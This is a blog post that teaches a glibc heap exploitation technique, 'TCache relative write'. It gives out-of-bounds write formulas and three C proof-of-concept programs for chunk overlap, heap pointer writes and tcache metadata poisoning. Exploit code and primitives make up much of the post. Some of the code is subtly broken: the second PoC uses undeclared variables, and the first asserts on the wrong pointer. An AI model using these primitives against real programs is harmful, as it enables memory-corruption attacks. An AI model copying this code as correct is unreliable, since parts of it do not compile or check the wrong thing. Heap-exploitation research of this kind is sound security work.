---
layout: post
title:  "TCache relative write"
toc: true
date:   2025-11-25 09:16:42 -0500
categories: heap-exploit
---

* Do not remove this line (it will not be displayed)
{:toc}

### Introduction

*TCache relative write* is a TCache-based heap exploitation technique with the following objectives:
* To write an arbitrary value on an arbitrary location on heap. 
* To write the pointer of an attacker-controlled chunk on an arbitrary location on heap.

* **Cause:** UAF/Overflow 
* **Applicable versions:** `2.30` and higher versions

By accomplishing the first objective, an attacker is capable of writing arbitrary values into heap metadata or user data and `tcache->entries`. This capability opens the doors to wide range of other heap-related and program-specific techniques, like chunk overlapping, tcache metadata poisoning, user data overwrite, and other forms of heap metadata corruption to trick the allocator. 

By accomplishing the second objective, the pointer to an attacker-controlled chunk can be written out-of-bounds and into an arbitrary place on heap, which can be used to hijack program-specific tables, or to corrupt chunks and perform techniques like *tcache poisoning* and *fastbin attack*. You can possibly achieve a heap-leak with tcache-relative-write, by writing a tcache chunk's pointer into a part of heap that you can read from.

#### Prerequisites
* The ability to write a huge value on an arbitrary location
* Libc leak
* Being able to malloc/free with sizes higher than TCache maximum chunk size (0x408)

You can satisfy the first prerequisite by techniques like largebin attack, house of mind (fastbin), fastbin reverse into tcache, or any program-specific form of arbitrary address writing. You don't need full arbitrary value control on the writing address; writing a value higher than 64 is sufficient. 

### Summary
The core concept of "TCache relative writing" is based on the fact that when the allocator is recording a tcache chunk in `tcache_perthread_struct`, TCache mechanism does not enforce enough check and restraint on the computed tcachebin indice (`tc_idx`), thus WHERE the tcachebin count and head pointer can be written are not restricted by the allocator by any means. The allocator treats extended bin indices as valid in both `tcache_put` and `tcache_get` scenarios. If we're somehow able to write a huge value on one of the fields of `mp_` (`tcache_bins` from [`malloc_par`][malloc_par]), by requesting a chunk size higher than TCache range, we can control the place that a **tcachebin pointer** and **counter** is going to be written. Considering the fact that a `tcache_perthread_struct` is normally placed on heap, one can perform a *TCache relative write* on an arbitrary point located after the tcache metadata chunk (Even on `tcache->entries` list to poison tcache metadata). By writing the new freed tcache chunk's pointer, we can combine this technique with other techniques like tcache poisoning or fastbin corruption and to trigger a heap leak. By writing the new counter, we can poison `tcache->entries`, write arbitrary value into an arbitrary location of heap, with the right amount of mallocs and frees. With all these combined, one is able to create impactful chains of exploits, using this technique as their foundation.

### Brief review of `tcache_perthread_struct` management
For each thread that has invoked `__libc_malloc` there exists a heap-allocated structure which is responsible for tracking two main variables for each tcache bin: The counter (Current number of chunks in the tcachebin) and the tcache bin head pointer. Here's its [structure][tcache_perthread_struct]:
{% highlight C %}
typedef struct tcache_perthread_struct
{
  uint16_t num_slots[TCACHE_MAX_BINS];      // The counters list
  tcache_entry *entries[TCACHE_MAX_BINS];   // tcachebins pointers
} tcache_perthread_struct;
{% endhighlight %}

Assuming that `TCACHE_MAX_BINS` equals to 64, we have 128 bytes reserved for `num_slots` and 512 bytes for `entries`, making up a structure of 0x280 in size. So if this structure gets allocated on the heap, this is what it would look like if you used the `heap` command on pwndbg:
{% highlight bash %}
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x290 (with flag bits: 0x291)
{% endhighlight %}
 
Because tcache bins are managed in a LIFO manner, the head of a tcache bin always points to the most recently inserted chunk. So assuming we already have two chunks A and B of size 0x20, inserted respectively into tcache[0], and another 0x20 chunk (C) is inserted, this is a simplified representation of how it would look like: 
{% highlight C %}
// Before: 
num_slots[0] = 2

    tcache_entries[0]
       |
       V
       B -----(B->fd = &A->fd)---------> A (A->fd = NULL)

// After:
num_slots[0] = 3

    tcache_entries[0]
       |
       V
       C -----(C->fd = &B->fd)--------> B -----(B->fd = &A->fd)---------> A (A->fd = NULL)

{% endhighlight %}

Here's the code for `tcache_put` (`tcache_put_n` in GLIBC `>=2.42`):
{% highlight C %}
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  ...

  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
{% endhighlight %}
As we can see in the comment, it is caller's responsibility to ensure `tc_idx`'s validity. There are multiple scenarios that can lead to `tcache_put` call, but in our case we're just interested in how [`tcache_free`][tcache_free] calls it. So lets see how the caller actually handles `tc_idx`:
{% highlight C %}
static inline bool
tcache_free (mchunkptr p, INTERNAL_SIZE_T size)
{
  bool done = false;
  size_t tc_idx = csize2tidx (size);
  if (tcache != NULL && tc_idx < mp_.tcache_bins)
    {
      /* Check to see if it's already in the tcache.  */
      tcache_entry *e = (tcache_entry *) chunk2mem (p);

      /* This test succeeds on double free.  However, we don't 100%
	 trust it (it also matches random payload data at a 1 in
	 2^<size_t> chance), so verify it's not an unlikely
	 coincidence before aborting.  */
      if (__glibc_unlikely (e->key == tcache_key))
	tcache_double_free_verify (e, tc_idx);

      if (tcache->counts[tc_idx] < mp_.tcache_count)
	{
	  tcache_put (p, tc_idx);
	  done = true;
	}
    }
  return done;
} 
{% endhighlight %}
To calculate the corresponding tcache index (`tc_idx`) for a new freeing chunk, `tcache_free` uses the macro [`csize2tidx`][csize2tidx], which has the following defenition:

{% highlight C %}
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
{% endhighlight %}
Basically, `csize2tidx` computes the appropriate tcache index for a chunk **based on the requested size**. This index is then used by `tcache_put` to update `tcache_perthread_struct.entries` and `tcache_perthread_struct.num_slots`. In `tcache_free`, **the only check on `tc_idx` is its comparison with `mp_.tcache_bins`.**  

#### mp_ (`malloc_par`)
The `mp_` variable (based on `malloc_par`) is a structure that holds global configuration parameters that control the behavior of glibc malloc. There are many fields that affect memory allocation, mmap usage and trimming, but what we're particularly interested in are fields related to tcache:

{% highlight C %}
#if USE_TCACHE
  /* Maximum number of buckets to use.  */
  size_t tcache_bins;
  size_t tcache_max_bytes;
  /* Maximum number of chunks in each bucket.  */
  size_t tcache_count;
  /* Maximum number of chunks to remove from the unsorted list, which
     aren't used to prefill the cache.  */
  size_t tcache_unsorted_limit;
#endif
{% endhighlight %}

For TCache relative write, what we're interested in are the `tcache_bins` and `tcache_count` fields. `tcache_bins` stores the amount of available tcachebins; thus the maximum tcache indice equals `mp_.tcache_bins-1`. `tcache_count` holds the maximum amount of chunks that a tcachebin can store. As I mentioned above, `tc_idx` is simply compared with the `tcache_bins` field from this structure, therefore, overwriting `tcache_bins` with a large value enables us to pass large tcache indices. 

### What is wrong here?
The main problem here is that although `tcache_perthread_struct`'s fields are allocated and managed statically (since `TCACHE_MAX_BINS` is a constant), GLIBC's validation of `tc_idx` fails to account for this. `mp_.tcache_bins` alone as a dynamic should not be treated as a reliable indicator of whether a `tc_idx` is valid. If one is able to change `mp_.tcache_bins` -- for example by overwriting it with a value larger than 64 --, he can craft a large `tc_idx`, pass the `tc_idx < mp_.tcache_bins` check, and trigger an out-of-bounds relative write into heap.
* Note: In my opinion, this should be considered a design flaw. Although using a controllable parameter (`mp_.tcache_bins`) to make this check might look eligible for portability reasons, I believe this is a wrong approach of doing so. The developers should consider a **dynamic** and more portable solution for managing the tcache structure, so that if parameters are changed by any means, system's behavior remains expected.

So this was the easy part. The main question now is how we can actually control **WHERE** and **WHAT** value `tcache_put` is going to write? The relative write technique to write an attacker-controlled chunk ptr out-of-bounds is not something new, and has been used on fastbins in technique like *House of Husk*. What makes TCache relative write interesting is not just the fact that the mentioned goal can be achieved on TCache, but that it also gives an attacker the ability to choose WHAT to write (due to the associated counter variable). Although the only thing done with the counter variable is a single increment, an attacker can still achieve arbitrary value write, with the right amount of mallocs and frees.   

The rest of this post is focused on how we can use this poor indexing for our advantage. To create useful exploit chains, we have to be precise. So lets first do some basic math. 

### TCache relative write - The formulas
The idea is to craft a precise `tc_idx` such that, when it is used by `tcache_put`, the resulting write of tcachebin pointer and its counter occurs beyond the bounds of `tcache_perthread_struct` and into our target location. This is done by requesting a chunk with the right amount of size and then freeing it. To compute the right size, we have to consider `csize2tidx` and the pointer arithmetic within `tcache_put` when it comes to indexing. The only check that can stop us from out-of-bounds writing is the `tc_idx < mp_.tcache_bins` check, which can get bypassed by writing a large value on `mp_.tcache_bins`    

If we let `nb` be the internal form of the freeing chunk size, `MALLOC_ALIGNMENT=0x10`, and `MINSIZE=0x20`:
```
tc_index = (nb - 0x20 + 0x10 -1) / 0x10 = (nb - 0x11) / 0x10
```
Because `tc_index` is an integer:
```
tc_index = (nb-16)/16 - 1
```
So if `nb = 0x20` (least chunk size), then `tc_index = 0`, if `nb = 0x30`, then `tc_index = 1`, and so on.

With some knowledge of C pointer arithmetic, we can predict the location of the tcachebin pointer & counter write, just by having `nb` on our hands:
```
// Here `tcache` is just symbol for a pointer to the heap-allocated `tcache_perthread_struct` 
unsigned long *ptr_write_loc = (void*)(&tcache->entries) + 8*tc_index = (void*)(&tcache->entries) + (nb-16)/2 - 8
unsigned long *counter_write_loc = (void*)(&tcache->counts) + 2*tc_index = (void*)(&tcache->counts) + (nb-16)/8 - 2
```
In other words: 
* `Our_preferred_ptr_location = tcache_entries location + (nb-16)/2 - 8`
* `Our_preferred_counter_location = tcache_counts location + (nb-16)/8 - 2`

You might think that to compute `nb`, you need two pointer address, thus a heap leak. That is not true. You just have to compute the difference (delta) between fields of `tcache_perthread_struct` and your target location, which does not require a heap leak and can be easily done by a debugger. 

For example, if the tcache structure is allocated at `0x555555559000`, and you want to overwrite a half-word (`++counts[tc_index]`) at `0x5555555596b8`, delta would be:
```
delta = 0x5555555596b8 - (&tcache->counts) = 0x5555555596b8 - 0x555555559010 = 0x6a8
```  
Even if ASLR is on, the delta would always be `0x6a8`. So no heap-leak is required. 

Now to calculate nb for a count write:
```
delta = 0x6a8 = (nb-16)/8 - 2 --> nb = (0x6aa*8) + 16 = 0x3560 
```
So if we request a chunk of size `0x3550` and then free it, `counts[tc_index]` would be equal to `*0x5555555596b8`, thus by the count increment we actually increment whatever that is stored in `0x5555555596b8`.
Now assuming you want to write the freed chunk pointer's address at `0x5555555596c0`:
```
delta = 0x5555555596c0 - (&tcache->entries) = 0x5555555596c0 - 0x555555559090 = 0x630
(nb-16)/2 - 8 = 0x630 --> nb = 0xc80
```

### PoC
Here I discuss the PoC by implementing three ways of taking advantage, by using the discussed primitives:
* **Chunk overlapping attack**: To illustarte how an attacker can use the counter arbitrary write primitive to trigger chunk overlapping.
* **Chunk pointer arbitrary write**: To illustrate how an attacker can relative write the freed chunk's pointer into an arbitrary location of heap.
* **TCache metadata poisoning**: To illustrate how an attacker can trick the allocator into returning a pointer to an arbitrary location, by multiple increments on the elements of `tcache->entries`.


#### Triggering chunk overlap
Here's a PoC of how the *arbitrary counter-writing* capability can be used for a overlapping chunk attack:

{% highlight C %}
// This has been tested on GLIBC 2.41
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <malloc.h>

int main(void)
{
    setbuf(stdout, NULL);

    unsigned long *p1 = malloc(0x410);	// The chunk that we can overflow or have a UAF on
    unsigned long *p2 = malloc(0x100);	// The target chunk used to demonstrate chunk overlap
    size_t p2_orig_size = malloc_usable_size(p2);
    
    free(p1);

    /* VULNERABILITY */
    
    // --- Step 1: Write a huge value into mp_.tcache_bins ---
    // You should have the ability to write a huge value on an arbitrary location; this doesn't necessarily
    // mean a full arbitrary write. Writing any value larger than 64 would suffice.
    // This could be done in a program-specific way, or by a UAF/Overflow in target program. By a UAF/Overflow,
    // you can use techniques like largebin attack, fastbin_reverse_into_tcache and house of mind (fastbins).

    unsigned long *mp_tcache_bins = (void*)p1[0] - 0x938;   // Relative computation of &mp_.tcache_bins
    *mp_tcache_bins = 0x7fffffffffff;	// Write a large value into mp_.tcache_bins

    /* END VULNERABILITY */

    // ---------------------------------
    // | Ex: Trigger chunk overlapping |
    // ---------------------------------
    // To see the counter arbitrary write in practice, let's assume that we want to write counter on p2->size and make chunk p2 
    // a very large chunk, so that it overlaps chunk p3.   
    // First of all, we need to compute delta, then put it into the formula we discussed to get nb.
    void *tcache_counts = (void*)p1 - 0x290; 	// Get tcache->counts	
    unsigned long delta = ((void*)p2 - 6) - tcache_counts;

    // Based on the formula above: nb = 8*(delta+2)+16
    unsigned long nb = 8*(delta+2)+16;

    // That's it! Now we exactly know what chunk size we should request to trigger counter write on our target
    unsigned long *p = malloc(nb-0x10);	
    
    // Trigger TCache relative write
    free(p);
    
    // Now lets see if p2's size is changed
    assert(malloc_usable_size(p) > p2_orig_size);

    // Now we can free p2 and later recover it with a larger request
    free(p2);
    p = malloc(0x10100); 

    // Lets see if the new returned pointer equals p2 
    assert(p == p2);
}

{% endhighlight %}


#### Chunk pointer arbitrary write

{% highlight C %}
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <malloc.h>

int main(void)
{
    setbuf(stdout, NULL);

    unsigned long *p1 = malloc(0x410);	// The chunk that we can overflow or have a UAF on
    unsigned long *p2 = malloc(0x100);	// The target chunk used to demonstrate chunk overlap

    // -------------------------------------
    // | Ex: Chunk pointer arbitrary write |
    // -------------------------------------
    // Now to further demonstrate the power of tcache-relative write, lets relative write a freeing chunk
    // pointer into an arbitrary location. This can be used for tcache poisoning and fastbin corruption,  
    // House of Lore, etc.

    // Compute delta (The difference between &p1->fd and &tcache->entries)
    void *tcache_entries = (void*)p1 - 0x210;  // Compute &tcache->entries
    delta = (void*)p1 - tcache_entries;

    // Based on the formulas we discussed above: nb = 2*(delta+8)+16
    nb = 2*(delta+8)+16; 

    p = malloc(nb-0x10); 

    // Trigger tcache relative write (Write freeing pointer into p1->fd)
    free(p);

    assert(p1[0] == (unsigned long)p);

    // tcache poisoning, fastbin corruption (<2.32 only with tcache relative write), house of lore, etc....
}

{% endhighlight %}

#### TCache metadata poisoning
So in this scenario, you have at least one tcache chunk in `tcache->entries`. Using the *arbitrary counter-write* primitive, you can increase the pointer's value and set it on an arbitrary address, thus get a chunk from an arbitrary location. This location could be of shared libraries' range or just somewhere on heap. It should be reminded that whenever `tcache_put` wants to increase the counter, it simply increments whatever is inside `tcache->counts[tc_idx]`; So this means if you want to get a chunk from somewhere on heap, you still do not need a heap leak; but if you want to get a chunk from somewhere in libc, you need both a heap leak and libc leak. This technique can also be used to create a double-free or UAF.

**Note**: To be able to freely determine the tcachebin pointer, along with `mp_.tcache_bins`, you're also required to write a large value on `mp_.tcache_count` to bypass the 
`tcache->counts[tc_idx] < mp_.tcache_count`
check; otherwise you're restricted to a range of [0,7] on the overwritting address. 

{% highlight C %}
// This has been tested on GLIBC 2.41
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <malloc.h>

int main(void)
{
    setbuf(stdout, NULL);

    unsigned long *p1 = malloc(0x410);	// The chunk that we have UAF on (Used for Step 1)
    
    // Create the victim tcache chunk as our target for metadata poisoning
    void *victim = malloc(0x10);
    free(victim);

    void *target = malloc(0x60);        // The address we want to get a chunk from
    assert(target > victim);

    // Now lets use the arbitrary counter-write primitive to change the value of tcache->entries[0]
    void *tcache_counts = (void*)p1 - 0x290;    // Get tcache->counts
    void *tcache_entry = (void*)p1 - 0x210;   // Compute tcache->entries[0]
    unsigned long delta = tcache_entry - tcache_counts;

    // Based on the formula above: nb = 8*(delta+2)+16
    unsigned long nb = 8*(delta+2)+16;

    // Compute the distance between victim and our target
    size_t diff = (unsigned long)target - (unsigned long)victim;
    
    // Create chunks for trigger multiple tcache relative writes 
    unsigned long **p = malloc(8*diff);
    for(size_t i = 0; i < diff; i++)
    	p[i] = malloc(nb-0x10);

    free(p1);	// Free for libc leak

    /* VULNERABILITY */
    
    // --- Step 1: Write a huge value into mp_.tcache_bins and mp_.tcache_count ---
    // You should have the ability to write a huge value on an arbitrary location; this doesn't necessarily
    // mean a full arbitrary write. Writing any value larger than 64 would suffice.
    // This could be done in a program-specific way, or by a UAF/Overflow in target program. By a UAF/Overflow,
    // you can use techniques like largebin attack, fastbin_reverse_into_tcache and house of mind (fastbins).

    unsigned long *mp_tcache_bins = (void*)p1[0] - 0x938;   // Relative computation of &mp_.tcache_bins
    *mp_tcache_bins = 0x7fffffffffff;	// Write a large value into mp_.tcache_bins
    unsigned long *mp_tcache_count = (void*)mp_tcache_bins+16;
    *mp_tcache_count = 0x555555555555;	// Write a large value into mp_.tcache_count (to bypass the tcache->counts[tc_idx] < mp_.tcache_count check)

    /* END VULNERABILITY */

    // To reach our desired pointer, we have to increment the tcachebin pointer multiple times.
    for(size_t i = 0; i < diff; i++)
	free(p[i]);

    // Now, lets get it out. 
    void *ptr = malloc(0x10);

    assert(ptr == target);

    // We've got two pointers to the same chunk!
}
{% endhighlight %}

#### Is combination with tcache poisoning/fastbin corruption possible?
Yes, but on just two versions: 2.30 & 2.31. In `>=2.32`, the `e->next` pointer of a tcache chunk is **mangled**. The chunk pointers are saved in `tcache_perthread_struct` **unmangled**, therefore, we cannot use the arbitrary pointer write primitive to simply poison an arbitrary tcache chunk. Here is the involving code from `GLIBC 2.32`:

{% highlight C %}
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
{% endhighlight %}

If you want to get a chunk from arbitrary location in the latest versions, you can use the overlapping chunk or tcache metadata poisoning tricks I discussed above.
### Patch in 2.42 ?
It seems this technique is no longer applicable since `GLIBC 2.42`. This is because of the new large chunk management in the TCache mechanism. It now separates tcache chunks into two kinds: small tcache chunks and large tcache chunks. The large ones (The ones that have a `tc_idx >= 64`) are treated in a different way and there's a second `tc_idx` computed for these kind of tcache chunks, which is done different from the classic `csize2tidx`. See [`large_csize2tidx`][large_csize2tidx].

Here's the code tcache code in `__libc_free`:

{% highlight C %}
#if USE_TCACHE
  if (__glibc_likely (size < mp_.tcache_max_bytes && tcache != NULL))
    {
      /* Check to see if it's already in the tcache.  */
      tcache_entry *e = (tcache_entry *) chunk2mem (p);

      /* Check for double free - verify if the key matches.  */
      if (__glibc_unlikely (e->key == tcache_key))
        return tcache_double_free_verify (e);

      size_t tc_idx = csize2tidx (size);
      if (__glibc_likely (tc_idx < TCACHE_SMALL_BINS))
	{
          if (__glibc_likely (tcache->num_slots[tc_idx] != 0))
	    return tcache_put (p, tc_idx);
	}
      else
	{
	  tc_idx = large_csize2tidx (size);
	  if (size >= MINSIZE
	      && !chunk_is_mmapped (p)
              && __glibc_likely (tcache->num_slots[tc_idx] != 0))
	    return tcache_put_large (p, tc_idx);
	}
    }
#endif
{% endhighlight %}


So that's it guys. Any ideas or errors? You can reach me at: D4R30@protonmail.com

[large_csize2tidx]: https://elixir.bootlin.com/glibc/glibc-2.42/source/malloc/malloc.c#L3164
[malloc_par]: https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L1858
[tcache_perthread_struct]: https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L3120 
[tcache_free]: https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L3249
[csize2tidx]: https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L301
